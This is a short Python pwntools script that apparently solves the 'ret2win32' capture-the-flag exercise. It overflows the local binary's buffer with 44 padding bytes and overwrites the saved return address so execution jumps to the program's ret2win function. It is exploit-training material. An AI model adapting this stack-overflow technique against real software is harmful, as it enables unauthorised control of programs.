from pwn import *

bin = './ret2win32'
elf = ELF(bin)

p = process(bin)
print p.recv()

ret2win32 = elf.symbols['ret2win']
payload = 'A'*44
payload += p32(ret2win32)

p.sendline(payload)
print p.recvall()
